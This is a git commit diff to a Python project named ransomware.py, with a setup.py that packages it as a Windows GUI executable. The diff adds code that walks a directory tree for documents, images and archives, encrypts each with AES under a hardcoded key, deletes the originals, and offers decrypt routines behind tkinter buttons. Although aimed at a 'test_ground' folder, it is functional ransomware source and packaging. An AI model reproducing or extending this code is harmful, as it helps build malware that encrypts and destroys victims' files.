d1cbc76ea8afda0f435f598908c1585215a70ec6
xiangli <lixiangwd@gmail.com>
2017-04-15 17:11:30 -0500

    0.1

--- ransomware.py
+++ ransomware.py
@@ -1,12 +1,16 @@
 #!/usr/bin/python
+#@ credit to Eli Bendersky's website
 
 from os import walk
 import os, random, struct
 from Crypto.Cipher import AES
 from Crypto import Random
+import tkinter
+
+
 key = '0123456789abcdef'
-name = 'test.txt'
-path = './test_ground/'
+path=os.path.abspath(os.sep)
+path +='test_ground/'
 extension=['jpg','txt','doc','png','ppt','pdf','docx','psd','ai','tif','dmg','7z']
 
 class Ransom():
@@ -54,17 +58,70 @@ class Ransom():
         infile.close()
         os.remove(in_filename)
 
-    def lookfor_files(mypath):
+    def lookfor_files(mypath, type):
         f = []
-        for (dirpath, dirnames, filenames) in walk(mypath):
-            for files in filenames:
-                if files.lower().split(".")[-1] in extension:
-                    f.extend(filenames)
-        return f
+        if(type=='enc'):
+            for (dirpath, dirnames, filenames) in walk(mypath):
+                for files in filenames:
+                    if files.lower().split(".")[-1] in extension:
+                        p = os.path.abspath(os.path.join(dirpath,files))
+                        f.append(p)
+        else:
+            for (dirpath, dirnames, filenames) in walk(mypath):
+                for files in filenames:
+                    if (files.lower().split(".")[-1]=='enc'):
+                        p = os.path.abspath(os.path.join(dirpath,files))
+                        f.append(p)
+        return set(f)
+
+    def decryt_files(in_filename, out_filename=None, chunksize=64*1024):
+        """ 
+            Decrypts a file using AES (CBC mode) with the
+            given key. Parameters are similar to encrypt_file,
+            with one difference: out_filename, if not supplied
+            will be in_filename without its last extension
+            (i.e. if in_filename is 'aaa.zip.enc' then
+            out_filename will be 'aaa.zip')
+        """
+        if not out_filename:
+            out_filename = os.path.splitext(in_filename)[0]
+        with open(in_filename,'rb') as infile:
+            origsize = struct.unpack('<Q',infile.read(struct.calcsize('Q')))[0]
+            iv = infile.read(16)
+            decryptor = AES.new(key,AES.MODE_CBC,iv)
+
+            with open(out_filename,'wb') as outfile:
+                while True:
+                    chunk = infile.read(chunksize)
+                    if len(chunk)== 0:
+                        break
+                    outfile.write(decryptor.decrypt(chunk))
+
+
+                outfile.truncate(origsize)
+            infile.close()
+            os.remove(in_filename)
+
+
+    def encrypt_button():
+        filenames = ()
+        filenames = Ransom.lookfor_files(path,'enc')
+        print(filenames)
+        for f in filenames:
+            Ransom.encrypt_file(key,f)
+
+    def decrypt_button():
+        filenames = ()
+        filenames = Ransom.lookfor_files(path,'dec')
+        for f in filenames:
+            Ransom.decryt_files(f)
 
 
 if __name__ == "__main__":
-    filenames = []
-    filenames = Ransom.lookfor_files(path)
-    for f in filenames:
-        Ransom.encrypt_file(key,path+f)
+    top = tkinter.Tk()
+    E = tkinter.Button(top,text='enc',command = Ransom.encrypt_button)
+    E.pack()
+    D = tkinter.Button(top,text='dec',command = Ransom.decrypt_button)
+    D.pack()
+    top.mainloop()
+
--- setup.py
+++ setup.py
@@ -1,10 +1,15 @@
 #setup.py
 import sys
 from cx_Freeze import setup, Executable
+import os
+
+os.environ['TCL_LIBRARY'] = r'D:\Python35\tcl\tcl8.6'
+os.environ['TK_LIBRARY'] = r'D:\Python35\tcl\tk8.6'
+
 build_exe_options = {"packages": ["os","random","struct","Crypto.Cipher","Crypto"], "excludes": []}
 setup(
     name = "ransom",
     version = "0.1",
     description = "sb",
     options = {"build_exe": build_exe_options},
-    executables = [Executable("python.py", base = "Win32GUI")])
+    executables = [Executable("ransomware.py", base = "Win32GUI")])
